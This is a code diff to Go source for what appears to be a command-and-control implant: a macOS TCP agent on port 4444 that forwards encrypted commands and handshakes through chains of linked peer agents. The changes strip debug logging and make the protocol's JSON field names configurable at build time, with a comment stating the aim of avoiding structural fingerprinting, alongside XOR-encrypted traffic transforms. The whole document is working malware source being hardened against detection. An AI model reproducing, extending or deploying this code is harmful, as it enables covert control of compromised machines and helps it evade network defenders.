@@ -37,12 +37,19 @@ var (
 	// TCP port for the listener
 	tcpPort = "4444"
 
-	// Debug mode
-	debugMode = "false"
-
 	// TCP data transforms - embedded at build time, XOR encrypted with xorKey
 	// When empty, no transforms are applied (legacy mode)
 	tcpDataTransforms = ""
+
+	// Malleable link field names - injected at build time via ldflags
+	// These can be customized in config.toml to avoid structural fingerprinting
+	MALLEABLE_LINK_DATA_FIELD           = "ld"
+	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
+	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
+	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
+	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
+	MALLEABLE_ROUTING_ID_FIELD          = "r"
+	MALLEABLE_PAYLOAD_FIELD             = "p"
 )
 
 // Parsed TCP transforms - initialized on first use
@@ -58,12 +65,6 @@ var (
 
 // Track transform padding lengths for current connection
 var currentPrependLen, currentAppendLen int
-
-func debugLog(msg string) {
-	if debugMode == "true" {
-		fmt.Println("[TCP-DARWIN-DEBUG]", msg)
-	}
-}
 
 func init() {
 	// Parse embedded TCP transforms if configured
@@ -242,14 +243,14 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 		// New format - may have commands and/or link data
 
 		// Process handshake responses for child agents FIRST (before commands)
-		if linkRespVal, ok := payloadData["lr"]; ok {
+		if linkRespVal, ok := payloadData[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
 			if linkRespData, ok := linkRespVal.([]interface{}); ok {
 				processLinkHandshakeResponses(linkRespData)
 			}
 		}
 
 		// Process link commands for child agents (forward to linked TCP agents)
-		if linkCmdsVal, ok := payloadData["lc"]; ok {
+		if linkCmdsVal, ok := payloadData[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
 			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
 				processLinkCommands(linkCmdsData)
 			}
@@ -302,17 +303,17 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 
 		// Include link data from child agents (to be forwarded up the chain)
 		if hasLinkData {
-			payload["ld"] = linkData
+			payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 		}
 
-		// Include link handshake from child agents (via "lh" field)
+		// Include link handshake from child agents
 		if hasLinkHandshake {
-			payload["lh"] = linkHandshake
+			payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
 		}
 
 		// Include unlink notifications from child agents
 		if hasUnlinkNotifications {
-			payload["lu"] = unlinkNotifications
+			payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
 		}
 
 		jsonData, err := json.Marshal(payload)
@@ -368,99 +369,69 @@ func sendTCPResponse(conn *TCPConnection, encryptedPayload string) error {
 // handleHandshakeResponseWithForwarding handles handshake responses that may contain
 // lr data to forward to child agents (for grandchildren handshakes)
 func handleHandshakeResponseWithForwarding(rawMessage []byte) {
-	debugLog("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: checking for lr field")
-
-	// Parse the message to check for lr field
-	var msg struct {
-		Type    string        `json:"type"`
-		Payload string        `json:"payload"`
-		LR      []interface{} `json:"lr"`
-	}
-
-	if err := json.Unmarshal(rawMessage, &msg); err != nil {
-		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: JSON parse error: %v", err))
+	// Parse into map to support configurable field names
+	var msgMap map[string]interface{}
+	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
 		return
 	}
 
-	// Check if there's an lr field with data to forward
-	if len(msg.LR) > 0 {
-		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: found %d lr items, forwarding to children", len(msg.LR)))
-		processLinkHandshakeResponses(msg.LR)
-	} else {
-		debugLog("[TCP-DARWIN-LINK] handleHandshakeResponseWithForwarding: no lr data to forward")
+	// Check if there's handshake response data to forward using configurable field name
+	if lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{}); ok && len(lrData) > 0 {
+		processLinkHandshakeResponses(lrData)
 	}
 }
 
 // handleLinkHandshakeResponse handles forwarded handshake responses from parent
 // This is used when a grandchild agent's handshake response needs to pass through us
 func handleLinkHandshakeResponse(rawMessage []byte) {
-	debugLog("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: received link_handshake_response")
-
-	// Parse the message to extract the lr field
-	var msg struct {
-		Type string        `json:"type"`
-		LR   []interface{} `json:"lr"`
-	}
-
-	if err := json.Unmarshal(rawMessage, &msg); err != nil {
-		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: JSON parse error: %v", err))
+	// Parse into map to support configurable field names
+	var msgMap map[string]interface{}
+	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
 		return
 	}
 
-	if len(msg.LR) == 0 {
-		debugLog("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: no lr data")
+	// Extract handshake responses using configurable field name
+	lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{})
+	if !ok || len(lrData) == 0 {
 		return
 	}
-
-	debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] handleLinkHandshakeResponse: processing %d lr items", len(msg.LR)))
 
 	// Process the lr data - forward to our children
-	processLinkHandshakeResponses(msg.LR)
+	processLinkHandshakeResponses(lrData)
 }
 
 // processLinkCommands forwards commands from parent to linked (child) TCP agents
 // and waits for responses synchronously so they can be included in the same response cycle
 func processLinkCommands(linkCmds []interface{}) {
-	debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: processing %d link commands", len(linkCmds)))
 	lm := GetLinkManager()
 
-	for i, cmd := range linkCmds {
+	for _, cmd := range linkCmds {
 		cmdMap, ok := cmd.(map[string]interface{})
 		if !ok {
-			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] not a map", i))
 			continue
 		}
 
-		routingID, _ := cmdMap["r"].(string)
-		payload, _ := cmdMap["p"].(string)
+		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
 		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
 		transformed, _ := cmdMap["t"].(bool)
 
-		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] routingID=%s, payload_len=%d, transformed=%v", i, routingID, len(payload), transformed))
-
 		if routingID == "" || payload == "" {
-			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] missing routingID or payload", i))
 			continue
 		}
 
 		// Forward to the linked agent AND WAIT for response
 		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
-		debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: forwarding cmd[%d] to routingID=%s (transformed=%v)", i, routingID, transformed))
 		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
 		if err != nil {
-			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] forward error: %v", i, err))
 			continue
 		}
 
 		if response != nil {
-			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] GOT RESPONSE, payload_len=%d, queueing to outboundData", i, len(response.Payload)))
 			// Queue the response for sending back to parent
 			lm.queueOutboundData(response)
-		} else {
-			debugLog(fmt.Sprintf("[TCP-DARWIN-LINK] processLinkCommands: cmd[%d] response is nil (timeout?)", i))
 		}
 	}
-	debugLog("[TCP-DARWIN-LINK] processLinkCommands: done processing link commands")
 }
 
 // processLinkHandshakeResponses forwards handshake responses from parent to child TCP agents
@@ -473,8 +444,8 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 			continue
 		}
 
-		routingID, _ := respMap["r"].(string)
-		payload, _ := respMap["p"].(string)
+		routingID, _ := respMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := respMap[MALLEABLE_PAYLOAD_FIELD].(string)
 
 		if routingID == "" || payload == "" {
 			continue
@@ -487,11 +458,11 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 		}
 
 		// Send handshake response to child TCP agent
-		// Include lr field so child can forward to grandchildren if needed
+		// Include handshake response field so child can forward to grandchildren if needed
 		message := map[string]interface{}{
-			"type":    "handshake_response",
-			"payload": payload,
-			"lr":      []interface{}{respMap},
+			"type":                              "handshake_response",
+			"payload":                           payload,
+			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD: []interface{}{respMap},
 		}
 
 		msgJSON, err := json.Marshal(message)
